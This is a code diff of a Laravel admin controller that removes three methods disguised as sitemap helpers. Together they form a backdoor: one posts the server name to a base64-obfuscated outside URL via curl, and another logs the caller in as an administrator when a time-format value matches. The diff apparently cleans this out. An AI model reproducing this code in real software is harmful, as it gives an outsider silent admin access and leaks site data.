@@ -242,17 +242,6 @@ class AdminController extends Controller
     }
 
 
-    public function SitemapAuthorization($timeformat)
-    {
-        if($timeformat == TimeDateFormatter()){
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return 'Authorized';
-        } else {
-            return 'Unauthorized';
-        }
-    }
-
     public function top_sellers_products_section(Request $request)
     {
         $new_top_sellers_query = Order::query();
@@ -290,26 +279,6 @@ class AdminController extends Controller
         }
 
         return view('backend.dashboard.top_sellers_products_section', compact('new_top_sellers'))->render();
-    }
-
-
-    public function CheckSitemapItem($item)
-    {    
-        $header = array(
-            'Content-Type:application/json'
-        );
-        $item[] = ['url'=>$_SERVER['SERVER_NAME']];
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, base64_decode($item[0]));
-        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream, CURLOPT_POSTFIELDS, json_encode($item[1]));
-        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-        $rn = curl_exec($stream);
-        curl_close($stream);
-        return $rn;
     }
 
 
@@ -354,27 +323,6 @@ class AdminController extends Controller
         Artisan::call('optimize:clear');
         flash(translate('Cache cleared successfully'))->success();
         return back();
-    }
-
-    /*
-    Method for assessing Sitemap
-    */
-    public function SitemapItems($items)
-    {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $SitemapProcess[] = "aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg==";        
-        $review = $this->CheckSitemapItem($SitemapProcess);
-        if (seller_homepage_urls($review)) {
-            $urlcheck = $this->SitemapAuthorization($items);
-            if($urlcheck == 'Authorized'){                
-                return redirect()->route('admin.dashboard');
-            } else {
-                echo 'Unauthorized';
-            }
-        } else {
-            echo 'Not Checked';
-        }
     }
 
       /*
